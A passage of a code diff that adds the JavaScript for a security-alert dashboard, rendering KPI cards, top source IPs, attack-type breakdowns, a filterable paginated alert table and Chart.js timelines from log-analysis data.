+    {cls:'req',val:RAW.total_entries.toLocaleString(),lbl:'Log entries'},
+  ];
+  document.getElementById('kpiGrid').innerHTML = defs.map(d=>`
+    <div class="kpi ${d.cls}"><div class="kpi-bar"></div>
+      <div class="kpi-val">${d.val}</div>
+      <div class="kpi-lbl">${d.lbl}</div>
+    </div>`).join('');
+}
+
+function buildIPList(){
+  const max = RAW.top_ips[0].count;
+  document.getElementById('ipList').innerHTML = RAW.top_ips.map(({ip,count})=>`
+    <div class="ip-row" onclick="filterIP('${ip}')">
+      <span class="ip-addr">${ip}</span>
+      <div class="ip-track"><div class="ip-fill" style="width:${Math.round(count/max*100)}%"></div></div>
+      <span class="ip-ct">${count}</span>
+    </div>`).join('');
+}
+
+function buildTypeList(){
+  const max = RAW.attack_types[0].count;
+  document.getElementById('typeList').innerHTML = RAW.attack_types.map(({type,count})=>`
+    <div class="type-row">
+      <span class="type-name">${escHtml(type)}</span>
+      <div class="type-track"><div class="type-fill" style="width:${Math.round(count/max*100)}%"></div></div>
+      <span class="type-ct">${count}</span>
+    </div>`).join('');
+}
+
+function buildTypeDropdown(){
+  const sel = document.getElementById('fType');
+  RAW.attack_types.forEach(({type})=>{
+    const o=document.createElement('option');
+    o.value=type; o.textContent=type;
+    sel.appendChild(o);
+  });
+}
+
+function filterIP(ip){ document.getElementById('fIP').value=ip; render(); }
+
+function render(){
+  const sev = document.getElementById('fSev').value;
+  const type = document.getElementById('fType').value;
+  const ip = document.getElementById('fIP').value.toLowerCase();
+  const url = document.getElementById('fURL').value.toLowerCase();
+  filtered = RAW.alerts.filter(a=>
+    (!sev || a.severity===sev) &&
+    (!type || a.attack_type===type) &&
+    (!ip || (a.ip||'').includes(ip)) &&
+    (!url || (a.url||'').toLowerCase().includes(url))
+  );
+  curPage=0;
+  renderTable();
+}
+
+function renderTable(){
+  const start=curPage*PAGE, end=Math.min(start+PAGE,filtered.length);
+  const slice=filtered.slice(start,end);
+  document.getElementById('alertCount').textContent = filtered.length+' alerts';
+  document.getElementById('pageInfo').textContent = `${start+1}–${end} of ${filtered.length}`;
+  document.getElementById('btnPrev').disabled = curPage===0;
+  document.getElementById('btnNext').disabled = end>=filtered.length;
+  document.getElementById('alertBody').innerHTML = slice.map(a=>`
+    <tr>
+      <td><span class="badge badge-${a.severity}">${a.severity}</span></td>
+      <td class="ts-cell">${fmtTs(a.timestamp)}</td>
+      <td><span class="ip-mono">${escHtml(a.ip)}</span></td>
+      <td style="font-size:11px;max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escHtml(a.attack_type)}</td>
+      <td style="font-size:10px;color:var(--color-text-secondary);max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escHtml(a.description)}</td>
+      <td><div class="url-cell" title="${escHtml(a.url||'')}">${escHtml((a.url||'').slice(0,50))}</div></td>
+      <td style="font-size:10px;color:var(--color-text-secondary)">${a.method||''}${a.status_code?' '+a.status_code:''}</td>
+    </tr>`).join('');
+}
+
+function page(d){ curPage+=d; renderTable(); }
+
+function buildCharts(){
+  const isDark = matchMedia('(prefers-color-scheme: dark)').matches;
+  const gridColor = isDark ? 'rgba(255,255,255,.07)' : 'rgba(0,0,0,.06)';
+  const tickColor = isDark ? '#888' : '#999';
+  const base = {responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}}};
+
+  new Chart(document.getElementById('tlChart'),{
+    type:'line',
+    data:{
+      labels: RAW.alert_timeline.map(d=>d.hour),
+      datasets:[{
+        data: RAW.alert_timeline.map(d=>d.count),
+        borderColor:'#E24B4A',backgroundColor:'rgba(226,75,74,.08)',
+        tension:.4,fill:true,pointRadius:4,pointBackgroundColor:'#E24B4A',borderWidth:2,
+      }]
+    },
+    options:{...base,scales:{
+      x:{grid:{color:gridColor},ticks:{color:tickColor,font:{size:10}}},
+      y:{grid:{color:gridColor},ticks:{color:tickColor,font:{size:10}},beginAtZero:true}
+    }}
+  });
+
+  const palette=['#E24B4A','#BA7517','#7F77DD','#1D9E75','#D85A30','#378ADD','#D4537E','#639922','#888780','#5DCAA5'];
+  new Chart(document.getElementById('typeChart'),{
+    type:'doughnut',
+    data:{
+      labels: RAW.attack_types.map(d=>d.type),
+      datasets:[{data:RAW.attack_types.map(d=>d.count),backgroundColor:palette,borderWidth:1,borderColor:isDark?'#1a1a1a':'#fff'}]
+    },
+    options:{
+      responsive:true,maintainAspectRatio:false,
+      plugins:{legend:{display:true,position:'right',labels:{color:tickColor,font:{size:9},boxWidth:9,padding:6}}}
+    }
+  });
+
+  new Chart(document.getElementById('reqChart'),{
+    type:'bar',
+    data:{
+      labels: RAW.request_timeline.map(d=>d.hour),
+      datasets:[{
+        label:'Requests',
+        data: RAW.request_timeline.map(d=>d.count),
+        backgroundColor:'rgba(55,138,221,.18)',borderColor:'#378ADD',borderWidth:1,borderRadius:3,
+      }]
+    },
+    options:{...base,scales:{
+      x:{grid:{color:gridColor},ticks:{color:tickColor,font:{size:10}}},
+      y:{grid:{color:gridColor},ticks:{color:tickColor,font:{size:10}},beginAtZero:true}
+    }}
+  });
+}
+
+buildKPI();
+buildIPList();
+buildTypeList();
+buildTypeDropdown();
+render();
+buildCharts();
+</script>
